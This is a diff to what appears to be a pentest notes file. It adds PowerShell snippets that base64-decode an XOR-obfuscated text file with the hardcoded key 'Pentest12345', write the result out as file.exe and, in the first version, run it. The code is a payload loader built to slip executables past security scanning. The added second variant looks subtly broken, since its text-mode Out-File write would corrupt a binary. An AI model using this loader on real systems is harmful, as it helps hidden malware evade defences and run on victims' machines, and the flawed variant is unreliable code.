@@ -39,10 +39,21 @@ Decodes a file.txt with xor to file.exe then runs
 ```
 $encoded = Get-Content -Path .\file.txt
 $decoded = [System.Convert]::FromBase64String($encoded)
-$key = [System.Text.Encoding]::ASCII.GetBytes("mysecretkey")
+$key = [System.Text.Encoding]::ASCII.GetBytes("Pentest12345")
 $decodedBytes = for ($i = 0; $i -lt $decoded.Length; $i++) {$decoded[$i] -bxor $key[$i % $key.Length]}
 [System.IO.File]::WriteAllBytes(".\file.exe", $decodedBytes)
 Start-Process -FilePath .\file.exe
+
+or 
+
+$encodedFile = Get-Content -Path "file.txt" -Raw
+$decodedBytes = [System.Convert]::FromBase64String($encodedFile)
+$key = [System.Text.Encoding]::ASCII.GetBytes("Pentest12345")
+$decoded = [char[]]$decodedBytes
+for ($i = 0; $i -lt $decoded.Length; $i++) {
+    $decoded[$i] = [char]([byte]$decoded[$i] -bxor $key[$i % $key.Length])
+}
+$decoded | Out-File -FilePath "file.exe"
 ```
 
 # Cname Scanner (go)
